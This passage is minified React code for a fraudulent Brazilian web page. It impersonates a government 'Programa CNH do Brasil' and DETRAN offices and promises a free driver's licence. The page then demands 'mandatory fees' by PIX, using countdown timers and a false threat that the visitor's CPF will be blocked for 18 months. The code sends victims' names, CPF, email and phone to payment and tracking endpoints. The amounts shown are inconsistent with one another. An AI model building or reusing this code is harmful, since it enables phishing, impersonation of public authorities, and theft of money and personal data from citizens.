            className: "space-y-6",
            children: [a.jsx("div", {
              className: "bg-green-50 rounded-lg p-5 mb-6",
              children: a.jsxs("div", {
                className: "text-center",
                children: [a.jsx("h4", {
                  className: "text-base font-semibold text-green-800 mb-3",
                  children: "Parabéns! Cadastro Aprovado com Sucesso"
                }), a.jsxs("p", {
                  className: "text-sm text-green-700 leading-relaxed",
                  children: ["Prezado(a) ", a.jsx("strong", {
                    children: o.nome
                  }), ", CPF ", a.jsx("strong", {
                    children: u(o.cpf)
                  }), ", informamos que sua solicitação foi analisada e ", a.jsx("strong", {
                    children: "APROVADA"
                  }), " pelo Sistema Nacional de Habilitação."]
                }), a.jsxs("p", {
                  className: "text-sm text-green-700 leading-relaxed mt-2",
                  children: ["O(A) senhor(a) está apto(a) a obter a Carteira Nacional de Habilitação (CNH) de forma ", a.jsx("strong", {
                    children: "gratuita"
                  }), ", sem a necessidade de frequentar autoescola, conforme as diretrizes do Programa CNH do Brasil."]
                }), a.jsx("p", {
                  className: "text-sm text-green-700 leading-relaxed mt-2",
                  children: "Para dar continuidade ao processo, selecione abaixo o DETRAN correspondente ao seu estado de residência."
                })]
              })
            }), a.jsxs("div", {
              className: "mt-6",
              children: [a.jsx("h4", {
                className: "font-semibold text-[#1351B4] mb-4 text-center text-lg border-b-2 border-[#1351B4] pb-2",
                children: "Selecione o DETRAN do seu Estado"
              }), a.jsx("div", {
                className: "space-y-2",
                children: l.map(h => a.jsxs("div", {
                  className: "flex items-center justify-between p-3 bg-white rounded-sm border border-gray-300 shadow-sm hover:shadow-md hover:border-[#1351B4] transition-all",
                  children: [a.jsxs("div", {
                    className: "flex flex-col gap-1",
                    children: [a.jsxs("span", {
                      className: "font-medium text-gray-800",
                      children: ["Detran ", h.nome]
                    }), a.jsxs("span", {
                      className: "text-sm text-[#1351B4] font-semibold bg-[#1351B4]/10 px-2 py-0.5 rounded-sm w-fit",
                      children: [h.vagas, " vagas"]
                    })]
                  }), a.jsx("button", {
                    onClick: () => f(h),
                    className: "bg-[#1351B4] hover:bg-[#0D3A8C] text-white px-5 py-2 rounded-sm text-sm font-medium transition-all shadow-sm hover:shadow-md whitespace-nowrap",
                    children: "Iniciar Processo"
                  })]
                }, h.uf))
              })]
            })]
          })]
        })]
      })
    })]
  })
}
function uT() {
  const [e, t] = x.useState(600);
  x.useEffect(() => {
    if (e <= 0)
      return;
    const o = setInterval(() => {
      t(i => i - 1)
    }
      , 1e3);
    return () => clearInterval(o)
  }
    , [e]);
  const n = Math.floor(e / 60)
    , r = e % 60
    , s = () => {
      window.location.href = "/pix-payment" + window.location.search
    }
    ;
  return a.jsxs("div", {
    className: "min-h-screen bg-gradient-to-b from-gray-50 to-white",
    children: [a.jsx(st, {}), a.jsx("main", {
      className: "container mx-auto px-4 py-8",
      children: a.jsxs(En, {
        className: "max-w-xl mx-auto shadow-lg border-0",
        children: [a.jsxs(wi, {
          className: "text-center space-y-2 pb-6 border-b",
          children: [a.jsx(bi, {
            className: "text-2xl font-bold text-gray-900",
            children: "Finalizar Cadastro"
          }), a.jsx("p", {
            className: "text-gray-600",
            children: "Programa CNH do Brasil"
          })]
        }), a.jsx(Tn, {
          className: "pt-6",
          children: a.jsxs("div", {
            className: "mb-8",
            children: [a.jsxs("p", {
              className: "text-base text-green-800 mb-4",
              children: [a.jsx("strong", {
                children: "Cadastro aprovado!"
              }), " Para finalizar, é necessário pagar as taxas obrigatórias do DETRAN:"]
            }), a.jsxs("div", {
              className: "bg-white p-4 rounded-md mb-6 border border-gray-200",
              children: [a.jsx("h4", {
                className: "font-semibold text-gray-800 mb-3",
                children: "Taxas Obrigatórias:"
              }), a.jsxs("div", {
                className: "space-y-2 text-sm text-gray-700",
                children: [a.jsxs("div", {
                  className: "flex justify-between items-start",
                  children: [a.jsxs("span", {
                    children: ["• Taxa de Expedição", a.jsx("br", {}), "do Documento (TED)"]
                  }), a.jsx("span", {
                    className: "font-bold whitespace-nowrap",
                    children: "R$26,13"
                  })]
                }), a.jsxs("div", {
                  className: "flex justify-between items-start",
                  children: [a.jsxs("span", {
                    children: ["• Taxa de Serviço", a.jsx("br", {}), "Administrativo (TSA)"]
                  }), a.jsx("span", {
                    className: "font-bold whitespace-nowrap",
                    children: "R$19,30"
                  })]
                }), a.jsxs("div", {
                  className: "flex justify-between items-start",
                  children: [a.jsxs("span", {
                    children: ["• Taxa de Processamento", a.jsx("br", {}), "e Emissão (TPE)"]
                  }), a.jsx("span", {
                    className: "font-bold whitespace-nowrap",
                    children: "R$19,30"
                  })]
                }), a.jsx("hr", {
                  className: "my-2"
                }), a.jsxs("div", {
                  className: "flex justify-between font-bold text-base",
                  children: [a.jsx("span", {
                    children: "Total:"
                  }), a.jsx("span", {
                    className: "whitespace-nowrap",
                    children: "R$94,73"
                  })]
                })]
              })]
            }), a.jsxs("div", {
              className: "space-y-4 mb-8",
              children: [a.jsxs("div", {
                className: "p-4 bg-yellow-50 rounded-lg border border-yellow-100",
                children: [a.jsx("div", {
                  className: "flex justify-center mb-3",
                  children: a.jsxs("div", {
                    className: "bg-yellow-500 text-white px-4 py-2 rounded-full font-bold text-xl",
                    children: [String(n).padStart(2, "0"), ":", String(r).padStart(2, "0")]
                  })
                }), a.jsx("p", {
                  className: "text-yellow-800 text-center font-medium",
                  children: "Atenção: Sua vaga está reservada temporariamente"
                }), a.jsx("p", {
                  className: "text-yellow-700 text-sm text-center mt-2",
                  children: "Complete o pagamento antes que o tempo expire ou sua vaga será disponibilizada para outro cidadão"
                })]
              }), a.jsxs("div", {
                className: "flex items-center gap-2 p-4 bg-red-50 rounded-lg border border-red-100",
                children: [a.jsx(tN, {
                  className: "h-5 w-5 shrink-0 text-red-500"
                }), a.jsxs("p", {
                  className: "text-red-800 text-sm",
                  children: [a.jsx("strong", {
                    children: "Importante:"
                  }), " O não pagamento resultará na perda permanente do direito ao programa e sua vaga será imediatamente liberada para outro cidadão na fila de espera"]
                })]
              })]
            }), a.jsx(Mn, {
              className: "w-full bg-green-600 hover:bg-green-700 text-white py-7 text-lg font-semibold rounded-lg transition-all duration-200 shadow-lg hover:shadow-xl",
              onClick: s,
              children: "Finalizar Cadastro"
            })]
          })
        })]
      })
    })]
  })
}
function dT() {
  var A;
  const [, e] = Un()
    , [t, n] = x.useState(null)
    , [r, s] = x.useState(!1)
    , [o, i] = x.useState(!1)
    , [l, c] = x.useState(600)
    , [u, d] = x.useState(null)
    , [f, h] = x.useState(null)
    , [y, b] = x.useState("pending")
    , v = x.useRef(!1)
    , [C, g] = x.useState(null);
  x.useEffect(() => {
    const k = localStorage.getItem("userData");
    if (k)
      try {
        g(JSON.parse(k))
      } catch (D) {
        console.error("Error parsing userData:", D)
      }
  }
    , []);
  const m = k => k ? k.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4") : "";
  x.useEffect(() => {
    if (l <= 0)
      return;
    const k = setInterval(() => {
      c(D => D - 1)
    }
      , 1e3);
    return () => clearInterval(k)
  }
    , [l]),
    x.useEffect(() => {
      v.current || (v.current = !0,
        w())
    }
      , []);
  const p = x.useCallback(async k => {
    try {
      const q = await (await fetch(`/api/check-pix.php/${k}`)).json();
      if (q.success && q.status) {
        if (b(q.status),
          q.status === "paid") {
          console.log("PAGAMENTO CONFIRMADO!");
          const I = `fb_conversion_${k}`;
          return !localStorage.getItem(I) && typeof window.fbq < "u" && (window.fbq("track", "Purchase", {
            value: (t == null ? void 0 : t.amount) || 94.73,
            currency: "BRL",
            content_name: "Pagamento via PIX - CNH do Brasil",
            content_type: "product",
            content_ids: [k],
            transaction_id: k
          }),
            localStorage.setItem(I, new Date().toISOString())),
            setTimeout(() => {
              e("/success")
            }
              , 1e3),
            !0
        } else if (q.status === "expired" || q.status === "cancelled")
          return console.log("Transação expirada ou cancelada"),
            d("Transação expirada ou cancelada. Por favor, tente novamente."),
            !0
      }
      return !1
    } catch (D) {
      return console.error("Erro ao verificar status:", D),
        !1
    }
  }
    , [t, e]);
  x.useEffect(() => {
    if (!(t != null && t.transaction_id))
      return;
    const k = setInterval(async () => {
      await p(t.transaction_id) && clearInterval(k)
    }
      , 5e3);
    return () => clearInterval(k)
  }
    , [t == null ? void 0 : t.transaction_id, p]);
  const w = async () => {
    s(!0),
      d(null);
    try {
      const k = localStorage.getItem("userData");
      if (!k) {
        d("Dados do usuário não encontrados");
        return
      }
      const D = JSON.parse(k)
        , I = await (await fetch("/api/create-pix.php", {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({
            amount: 94.73,
            customer_name: D.nome,
            customer_email: D.email,
            customer_phone: D.phone,
            customer_cpf: D.cpf,
            utmParams: Object.fromEntries(new URLSearchParams(window.location.search))
          })
        })).json();
      if (I.success) {
        try {
          fetch("/proxy_notificar_utmify.php", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              transactionId: I.transaction_id,
              valorEmCentavos: 9473,
              nomeCliente: D.nome,
              emailCliente: D.email,
              cpfCliente: D.cpf,
              telefoneCliente: D.phone,
              utmParams: Object.fromEntries(new URLSearchParams(window.location.search)),
              productIdForPixel: "CNH_TAXA_01",
              productNameForPixel: "Taxas Administrativas CNH",
              productQuantity: 1
            })
          });
        } catch (err) { console.error("Utmify Error", err); }
        if (n(I),
          I.pix_code)
          try {
            const H = await uo.toDataURL(I.pix_code, {
              width: 256,
              margin: 2,
              color: {
                dark: "#000000",
                light: "#FFFFFF"
              }
            });
            h(H)
          } catch (H) {
            console.error("Erro ao gerar QR code:", H)
          }
      } else
        d(I.error || "Erro ao gerar PIX")
    } catch (k) {
      console.error("Erro ao criar transação PIX:", k),
        d("Erro ao conectar com o servidor")
    } finally {
      s(!1)
    }
  }
    , S = async () => {
      if (t != null && t.pix_code)
        try {
          await navigator.clipboard.writeText(t.pix_code),
            i(!0),
            setTimeout(() => i(!1), 2e3)
        } catch (k) {
          console.error("Erro ao copiar:", k)
        }
    }
    , N = Math.floor(l / 60)
    , P = l % 60;
  return r ? a.jsxs("div", {
    className: "min-h-screen bg-gradient-to-b from-gray-50 to-white",
    children: [a.jsx(st, {}), a.jsx("main", {
      className: "container mx-auto px-4 py-8",
      children: a.jsx(En, {
        className: "max-w-xl mx-auto",
        children: a.jsx(Tn, {
          className: "pt-6",
          children: a.jsxs("div", {
            className: "text-center",
            children: [a.jsx("div", {
              className: "animate-spin rounded-full h-8 w-8 border-b-2 border-blue-600 mx-auto mb-4"
            }), a.jsx("p", {
              children: "Gerando PIX..."
            })]
          })
        })
      })
    })]
  }) : u ? a.jsxs("div", {
    className: "min-h-screen bg-gradient-to-b from-gray-50 to-white",
    children: [a.jsx(st, {}), a.jsx("main", {
      className: "container mx-auto px-4 py-8",
      children: a.jsxs(En, {
        className: "max-w-xl mx-auto",
        children: [a.jsx(wi, {
          className: "text-center space-y-2 pb-6 border-b",
          children: a.jsx(bi, {
            className: "text-2xl font-bold text-red-600",
            children: "Erro no Pagamento"
          })
        }), a.jsx(Tn, {
          className: "pt-6",
          children: a.jsxs("div", {
            className: "text-center space-y-4",
            children: [a.jsx("div", {
              className: "bg-red-50 p-4 rounded-lg border border-red-100",
              children: a.jsx("p", {
                className: "text-red-800 text-sm",
                children: u
              })
            }), a.jsxs("div", {
              className: "bg-blue-50 p-4 rounded-lg border border-blue-100",
              children: [a.jsx("h4", {
                className: "font-semibold text-blue-900 mb-2",
                children: "O que fazer:"
              }), a.jsxs("ul", {
                className: "text-sm text-blue-800 text-left space-y-1",
                children: [a.jsx("li", {
                  children: "• Verifique seus dados e tente novamente"
                }), a.jsx("li", {
                  children: "• Entre em contato com o suporte se o problema persistir"
                }), a.jsx("li", {
                  children: "• Alternativamente, use outro método de pagamento"
                })]
              })]
            }), a.jsxs("div", {
              className: "flex gap-3",
              children: [a.jsx(Mn, {
                onClick: () => window.location.reload(),
                className: "flex-1 bg-[#1351B4] hover:bg-[#1351B4]/90 text-white",
                children: "Tentar Novamente"
              }), a.jsx(Mn, {
                onClick: () => e("/pagamento"),
                variant: "outline",
                className: "flex-1",
                children: "Voltar"
              })]
            })]
          })
        })]
      })
    })]
  }) : y === "paid" ? a.jsxs("div", {
    className: "min-h-screen bg-gradient-to-b from-gray-50 to-white",
    children: [a.jsx(st, {}), a.jsx("main", {
      className: "container mx-auto px-4 py-8",
      children: a.jsx(En, {
        className: "max-w-xl mx-auto",
        children: a.jsx(Tn, {
          className: "pt-6",
          children: a.jsxs("div", {
            className: "text-center",
            children: [a.jsx("div", {
              className: "w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4",
              children: a.jsx(Ft, {
                className: "w-8 h-8 text-green-600"
              })
            }), a.jsx("h2", {
              className: "text-2xl font-bold text-green-600 mb-2",
              children: "Pagamento Confirmado!"
            }), a.jsx("p", {
              className: "text-gray-600",
              children: "Redirecionando..."
            })]
          })
        })
      })
    })]
  }) : a.jsxs("div", {
    className: "min-h-screen bg-gradient-to-b from-gray-50 to-white",
    children: [a.jsx(st, {}), a.jsx("main", {
      className: "container mx-auto px-4 py-8",
      children: a.jsxs(En, {
        className: "max-w-xl mx-auto shadow-lg border-0",
        children: [a.jsxs(wi, {
          className: "space-y-4 pb-6 border-b",
          children: [a.jsx(bi, {
            className: "text-xl font-bold text-gray-900 text-center",
            children: "Detalhes da Cobrança"
          }), a.jsxs("div", {
            className: "bg-gray-50 p-4 rounded-lg space-y-3",
            children: [a.jsxs("div", {
              className: "flex justify-between items-center",
              children: [a.jsx("span", {
                className: "text-gray-600 text-sm",
                children: "Nome:"
              }), a.jsx("span", {
                className: "font-medium text-gray-900",
                children: (C == null ? void 0 : C.nome) || "Carregando..."
              })]
            }), a.jsxs("div", {
              className: "flex justify-between items-center",
              children: [a.jsx("span", {
                className: "text-gray-600 text-sm",
                children: "CPF:"
              }), a.jsx("span", {
                className: "font-medium text-gray-900",
                children: m((C == null ? void 0 : C.cpf) || "")
              })]
            }), a.jsxs("div", {
              className: "flex justify-between items-center",
              children: [a.jsx("span", {
                className: "text-gray-600 text-sm",
                children: "Valor:"
              }), a.jsx("span", {
                className: "font-bold text-green-600",
                children: "R$ 86,45"
              })]
            }), a.jsxs("div", {
              className: "flex justify-between items-center",
              children: [a.jsx("span", {
                className: "text-gray-600 text-sm",
                children: "Situação:"
              }), a.jsx("span", {
                className: "font-medium text-yellow-600 bg-yellow-100 px-2 py-1 rounded text-sm",
                children: "Aguardando pagamento"
              })]
            })]
          }), a.jsx("div", {
            className: "bg-red-600 p-4 rounded-lg",
            children: a.jsxs("div", {
              className: "flex flex-col items-center text-center",
              children: [a.jsx("svg", {
                className: "h-10 w-10 text-white mb-3",
                fill: "currentColor",
                viewBox: "0 0 20 20",
                children: a.jsx("path", {
                  fillRule: "evenodd",
                  d: "M8.257 3.099c.765-1.36 2.722-1.36 3.486 0l5.58 9.92c.75 1.334-.213 2.98-1.742 2.98H4.42c-1.53 0-2.493-1.646-1.743-2.98l5.58-9.92zM11 13a1 1 0 11-2 0 1 1 0 012 0zm-1-8a1 1 0 00-1 1v3a1 1 0 002 0V6a1 1 0 00-1-1z",
                  clipRule: "evenodd"
                })
              }), a.jsxs("div", {
                className: "text-white text-sm",
                children: [a.jsx("p", {
                  className: "font-bold mb-2",
                  children: "ATENÇÃO - AVISO IMPORTANTE"
                }), a.jsxs("p", {
                  className: "mb-2",
                  children: ["O processo de cadastro do seu CPF já foi aberto junto ao DETRAN. Caso o pagamento das taxas obrigatórias não seja realizado dentro do prazo estabelecido, seu CPF ficará ", a.jsx("strong", {
                    children: "bloqueado no sistema do DENATRAN pelo período de 18 meses"
                  }), ", ficando impedido de emitir a CNH durante este período."]
                }), a.jsx("p", {
                  className: "font-semibold",
                  children: "Realize o pagamento agora e evite maiores transtornos."
                })]
              })]
            })
          })]
        }), a.jsxs(Tn, {
          className: "pt-6",
          children: [a.jsx("div", {
            className: "mb-6",
            children: a.jsxs("div", {
              className: "p-4 bg-yellow-50 rounded-lg border border-yellow-100",
              children: [a.jsx("div", {
                className: "flex justify-center mb-3",
                children: a.jsxs("div", {
                  className: "bg-yellow-500 text-white px-4 py-2 rounded-full font-bold text-xl flex items-center gap-2",
                  children: [a.jsx(nN, {
                    className: "h-5 w-5"
                  }), String(N).padStart(2, "0"), ":", String(P).padStart(2, "0")]
                })
              }), a.jsx("p", {
                className: "text-yellow-800 text-center font-medium",
                children: "Tempo limite para pagamento"
              })]
            })
          }), a.jsxs("div", {
            className: "text-center mb-6",
            children: [a.jsxs("p", {
              className: "text-3xl font-bold text-green-600",
              children: ["R$ ", ((A = t == null ? void 0 : t.amount) == null ? void 0 : A.toFixed(2).replace(".", ",")) || "86,45"]
            }), a.jsx("p", {
              className: "text-gray-600",
              children: "Valor a ser pago"
            })]
          }), a.jsxs("div", {
            className: "text-center mb-6",
            children: [f ? a.jsx("div", {
              className: "bg-white p-4 rounded-lg border-2 border-gray-200 inline-block",
              children: a.jsx("img", {
                src: f,
                alt: "QR Code PIX",
                className: "w-48 h-48"
              })
            }) : t != null && t.pix_code ? a.jsxs("div", {
              className: "bg-white p-8 rounded-lg border-2 border-gray-200 inline-block",
              children: [a.jsx("div", {
                className: "animate-spin rounded-full h-8 w-8 border-b-2 border-blue-600 mx-auto"
              }), a.jsx("p", {
                className: "text-sm text-gray-500 mt-2",
                children: "Gerando QR Code..."
              })]
            }) : a.jsx("div", {
              className: "bg-white p-8 rounded-lg border-2 border-gray-200 inline-block",
              children: a.jsx(iN, {
                className: "w-32 h-32 text-gray-400 mx-auto"
              })
            }), a.jsx("p", {
              className: "text-sm text-gray-600 mt-2",
              children: f || t != null && t.pix_code ? "Escaneie o QR Code com o app do seu banco" : "Use o código PIX abaixo no seu aplicativo bancário"
            })]
          }), (t == null ? void 0 : t.pix_code) && a.jsxs("div", {
            className: "mb-6",
            children: [a.jsx("p", {
              className: "text-sm font-medium text-gray-700 mb-2",
              children: "Código PIX Copia e Cola:"
            }), a.jsxs("div", {
              className: "space-y-3",
              children: [a.jsx("div", {
                className: "p-3 bg-gray-50 rounded-lg border font-mono text-sm break-all max-h-24 overflow-y-auto",
                children: t.pix_code
              }), a.jsxs(Mn, {
                onClick: S,
                className: "w-full flex items-center justify-center gap-2 bg-[#1351B4] hover:bg-[#1351B4]/90 text-white",
                children: [o ? a.jsx(Ft, {
                  className: "h-4 w-4"
                }) : a.jsx(Kl, {
                  className: "h-4 w-4"
                }), o ? "Copiado!" : "Copiar Código PIX"]
              })]
            })]
          }), a.jsxs("div", {
            className: "bg-blue-50 p-4 rounded-lg border border-blue-100 mb-6",
            children: [a.jsx("h4", {
              className: "font-semibold text-blue-900 mb-2",
              children: "Como pagar:"
            }), a.jsxs("ol", {
              className: "text-sm text-blue-800 space-y-1",
              children: [a.jsx("li", {
                children: "1. Abra o aplicativo do seu banco"
              }), a.jsx("li", {
                children: "2. Acesse a opção PIX"
              }), a.jsx("li", {
                children: "3. Escaneie o QR Code ou cole o código PIX"
              }), a.jsx("li", {
                children: "4. Confirme o pagamento de R$ 86,45"
              })]
            })]
          }), a.jsxs("div", {
            className: "bg-gray-50 p-3 rounded-lg border text-center mb-4",
            children: [a.jsxs("p", {
              className: "text-sm text-gray-600",
              children: ["Status: ", a.jsx("span", {
                className: "font-medium text-yellow-600",
                children: "Aguardando pagamento..."
              })]
            }), a.jsx("p", {
              className: "text-xs text-gray-500 mt-1",
              children: "O pagamento será confirmado automaticamente"
            })]
          }), t && a.jsx("div", {
            className: "border-t pt-4",
            children: a.jsxs("p", {
              className: "text-xs text-gray-500",
              children: ["ID da Transação: ", t.transaction_id]
            })
          })]
        })]
      })
    })]
  })
}
function fT(e) {
  return e.toLowerCase().split(" ").map(t => t.charAt(0).toUpperCase() + t.slice(1).toLowerCase()).join(" ")
}
function hT(e) {
  return e.replace(/\D/g, "").replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4")
}
function mT() {
  const [e, t] = x.useState(null)
    , [n] = x.useState(() => {
      const s = Date.now()
        , o = Math.floor(Math.random() * 1e4);
      return `CNH${s}${o}`
    }
    );
  x.useEffect(() => {
    try {
      const s = localStorage.getItem("userData");
      s && t(JSON.parse(s))
    } catch (s) {
      console.error("Error parsing user data:", s)
    }
  }
    , []);
  const r = new Date().toLocaleDateString("pt-BR", {
    day: "2-digit",
    month: "2-digit",
    year: "numeric",
    hour: "2-digit",
    minute: "2-digit"
  });
  return a.jsxs("div", {
    className: "min-h-screen bg-gradient-to-b from-gray-50 to-white",
    children: [a.jsx(st, {}), a.jsx("main", {
      className: "container mx-auto px-4 py-8",
      children: a.jsx(En, {
        className: "max-w-2xl mx-auto shadow-lg border-0",
        children: a.jsxs(Tn, {
          className: "pt-8 pb-8",
          children: [a.jsxs("div", {
            className: "text-center mb-8",
            children: [a.jsx("div", {
              className: "w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4",
              children: a.jsx(Ft, {
                className: "w-10 h-10 text-green-600"
              })
            }), a.jsx("h1", {
              className: "text-3xl font-bold text-green-600 mb-2",
              children: "Cadastro Concluído!"
            }), a.jsx("p", {
              className: "text-gray-600",
              children: "Parabéns! Seu cadastro no Programa CNH do Brasil foi finalizado com sucesso."
            })]
          }), a.jsxs("div", {
            className: "bg-[#1351B4] text-white p-6 rounded-lg mb-6",
            children: [a.jsxs("div", {
              className: "flex items-center justify-center gap-3 mb-4",
              children: [a.jsx(oN, {
                className: "h-8 w-8"
              }), a.jsx("h2", {
                className: "text-xl font-bold",
                children: "Programa CNH do Brasil"
              })]
            }), a.jsxs("div", {
              className: "text-center",
              children: [a.jsx("p", {
                className: "text-sm opacity-90 mb-1",
                children: "Número do Protocolo:"
              }), a.jsx("p", {
                className: "text-2xl font-mono font-bold tracking-wider",
                children: n
              })]
            })]
          }), a.jsxs("div", {
            className: "bg-gray-50 p-6 rounded-lg mb-6",
            children: [a.jsx("h3", {
              className: "font-semibold text-gray-900 mb-4 text-center",
              children: "Dados do Cadastro"
            }), a.jsxs("div", {
              className: "space-y-3",
              children: [a.jsxs("div", {
                className: "flex justify-between border-b pb-2",
                children: [a.jsx("span", {
                  className: "text-gray-600",
                  children: "Nome:"
                }), a.jsx("span", {
                  className: "font-medium text-gray-900",
                  children: e ? fT(e.nome) : "-"
                })]
              }), a.jsxs("div", {
                className: "flex justify-between border-b pb-2",
                children: [a.jsx("span", {
                  className: "text-gray-600",
                  children: "CPF:"
                }), a.jsx("span", {
                  className: "font-medium text-gray-900",
                  children: e ? hT(e.cpf) : "-"
                })]
              }), a.jsxs("div", {
                className: "flex justify-between border-b pb-2",
                children: [a.jsx("span", {
                  className: "text-gray-600",
                  children: "Data de Nascimento:"
                }), a.jsx("span", {
                  className: "font-medium text-gray-900",
                  children: (e == null ? void 0 : e.data_nascimento) || "-"
                })]
              }), a.jsxs("div", {
                className: "flex justify-between border-b pb-2",
                children: [a.jsx("span", {
                  className: "text-gray-600",
                  children: "Data do Cadastro:"
                }), a.jsx("span", {
                  className: "font-medium text-gray-900",
                  children: r
                })]
              }), a.jsxs("div", {
                className: "flex justify-between",
                children: [a.jsx("span", {
                  className: "text-gray-600",
                  children: "Status:"
                }), a.jsx("span", {
                  className: "font-medium text-green-600",
                  children: "Ativo"
                })]
              })]
            })]
          }), a.jsxs("div", {
            className: "bg-blue-50 p-4 rounded-lg border border-blue-100 mb-6",
            children: [a.jsx("h4", {
              className: "font-semibold text-blue-900 mb-2",
              children: "Próximos Passos:"
            }), a.jsxs("ul", {
              className: "text-sm text-blue-800 space-y-2",
              children: [a.jsx("li", {
                children: "• Aguarde a confirmação por e-mail em até 48 horas"
              }), a.jsx("li", {
                children: "• Você receberá instruções para agendar suas aulas"
              }), a.jsx("li", {
                children: "• Compareça ao DETRAN mais próximo com seus documentos"
              }), a.jsx("li", {
                children: "• Guarde seu número de protocolo para consultas"
              })]
            })]
          }), a.jsxs("div", {
            className: "flex gap-3",
            children: [a.jsxs(Mn, {
              onClick: () => window.print(),
              variant: "outline",
              className: "flex-1 flex items-center justify-center gap-2",
              children: [a.jsx(rN, {
                className: "h-4 w-4"
              }), "Salvar Comprovante"]
            }), a.jsx(Mn, {
              onClick: () => window.location.href = "/",
              className: "flex-1 bg-[#1351B4] hover:bg-[#1351B4]/90 text-white",
              children: "Voltar ao Início"
            })]
          }), a.jsx("div", {
            className: "mt-6 pt-4 border-t text-center",
            children: a.jsx("p", {
              className: "text-xs text-gray-500",
              children: "Em caso de dúvidas, entre em contato através do portal gov.br"
            })
          })]
        })
      })
    })]
  })
}
let Hg = !1;
function pT() {
  try {
    if (Hg)
      return;
    Hg = !0;
    const e = window
      , t = "D51Q3RRC77U6T74NA0NG";
    if (!e.ttq) {
      e.TiktokAnalyticsObject = "ttq";
      const r = e.ttq = e.ttq || [];
      r.methods = ["page", "track", "identify", "instances", "debug", "on", "off", "once", "ready", "alias", "group", "enableCookie", "disableCookie", "holdConsent", "revokeConsent", "grantConsent"],
        r.setAndDefer = function (s, o) {
          s[o] = function () {
            s.push([o].concat(Array.prototype.slice.call(arguments, 0)))
          }
        }
        ;
      for (let s = 0; s < r.methods.length; s++)
        r.setAndDefer(r, r.methods[s]);
      r.instance = function (s) {
        const o = r._i[s] || [];
        for (let i = 0; i < r.methods.length; i++)
          r.setAndDefer(o, r.methods[i]);
        return o
      }
        ,
        r.load = function (s, o) {
          const i = "https://analytics.tiktok.com/i18n/pixel/events.js";
          r._i = r._i || {},
            r._i[s] = [],
            r._i[s]._u = i,
            r._t = r._t || {},
            r._t[s] = +new Date,
            r._o = r._o || {},
            r._o[s] = o || {};
          const l = document.createElement("script");
          l.type = "text/javascript",
            l.async = !0,
            l.src = i + "?sdkid=" + s + "&lib=ttq";
          const c = document.getElementsByTagName("script")[0];
          c && c.parentNode && c.parentNode.insertBefore(l, c)
        }
    }
    const n = e.ttq;
    if (n && n.load && n.instance) {
      (!n._i || !n._i[t]) && n.load(t);
      const r = n.instance(t);
      r && r.track && (r.track("CompleteRegistration"),
        console.log("TikTok CompleteRegistration fired for pixel:", t))
    }
  } catch (e) {
    console.error("TikTok Pixel error:", e)
  }
}
const Wg = {
  AC: "https://www.agencia.ac.gov.br/wp-content/uploads/2019/07/Nova-Logo-Detran-Acre-2019-2-800x416.png",
  AL: "https://seeklogo.com/images/D/detran-alagoas-logo-C0D07878CA-seeklogo.com.png",
  AP: "https://www.exametoxicologico.com.br/wp-content/uploads/2019/03/Detran-Amapa-ap-exame-toxicologico.jpg",
  AM: "https://apstatic.prodam.am.gov.br/images/detran/logo-detran-horizontal.png",
  BA: "https://images.seeklogo.com/logo-png/39/1/detran-bahia-logo-png_seeklogo-395407.png",
  CE: "https://www.detran.ce.gov.br/wp-content/uploads/2018/04/logo_detran_2018.png",
  DF: "https://zpy-customer-communication-cms-strapi-images-2.s3.amazonaws.com/DETRAN_DF_378eeacd03.webp",
  ES: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRbFOyL7H4mp0igBsJUKg3y4m_7mg9xkqXPnQ&s",
  GO: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTmmhmirDeoyas3iEHwHapMrQ3vIHa0ivq3wQ&s",
  MA: "https://seeklogo.com/images/D/detran-maranhao-logo-4F04A57787-seeklogo.com.png",
  MT: "https://portalcredenciamento.detran.mt.gov.br/815ed82f649be4cc8df5e9e024e23482.png",
  MS: "https://d1yjjnpx0p53s8.cloudfront.net/styles/logo-thumbnail/s3/082015/detranms_0.png?itok=oDYhYuLp",
  MG: "https://www.camarauberlandia.mg.gov.br/DETRANMG.jpg/@@images/480d676e-e0af-433a-bec8-d9676a937a59.jpeg",
  PA: "https://www.roservalramos.com.br/wp-content/uploads/2020/01/detran-pa-consulta.jpg",
  PB: "https://www.segundaviadetudo.com.br/wp-content/uploads/2020/07/Logo-Detran-PB.png",
  PR: "https://reciclagemcnhonline.com.br/wp-content/uploads/2024/08/Detran-PR-600x170.png",
  PE: "https://www.detran.pe.gov.br/images/FOTO%202022/Design%20sem%20nome%204.jpg",
  PI: "https://conteudo.consultapelaplaca.com.br/wp-content/uploads/2024/10/Detran-PI-IPVA-PI-2024-1.jpg",
  RJ: "https://odia.ig.com.br/_midias/jpg/2020/07/27/1140x632/1_detran_rj_2020_1280x720-18488499.jpg",
  RN: "https://www.novacruz.rn.leg.br/detran.png/image_preview",
  RS: "https://yt3.googleusercontent.com/JMoN0dwOBMHH6MLzGDD9m9QKYTTXKNqSeZHKwO46Zg006Nl-Yf4Ug17edHRcVDPQUYewi03ApQ=s900-c-k-c0x00ffffff-no-rj",
  RO: "https://portaleducacional.detran.ro.gov.br/Content/images/LogoDetranGrandel.png",
  RR: "https://www.detran.rr.gov.br/wp-content/uploads/2021/09/logotipo-detran-rr.png",
  SC: "https://servicos.detran.sc.gov.br/images/og-image.png",
  SP: "https://grandesnomesdapropaganda.com.br/wp-content/uploads/2014/09/Logo-detran-SP.jpg",
  SE: "https://images.seeklogo.com/logo-png/55/1/detran-se-logo-png_seeklogo-550201.png",
  TO: "https://www.exametoxicologico.com.br/wp-content/uploads/2019/03/detran-to-exame-toxicologico.jpg"
};
function gT() {
  var Lh;
  const [, e] = Un()
    , [t, n] = x.useState([])
    , [r, s] = x.useState(!1)
    , [o, i] = x.useState("initial")
    , [l, c] = x.useState("")
    , [u, d] = x.useState("")
    , [f, h] = x.useState(null)
    , [y, b] = x.useState(null)
    , v = x.useRef(null)
    , C = x.useRef(!1)
    , g = x.useRef(!1)
    , [m, p] = x.useState("")
    , [w, S] = x.useState(null)
    , [N, P] = x.useState(!1)
    , [A, k] = x.useState(!1)
    , [D, q] = x.useState("")
    , [I, H] = x.useState("pending")
    , [z, te] = x.useState(600)
    , [se, X] = x.useState(null)
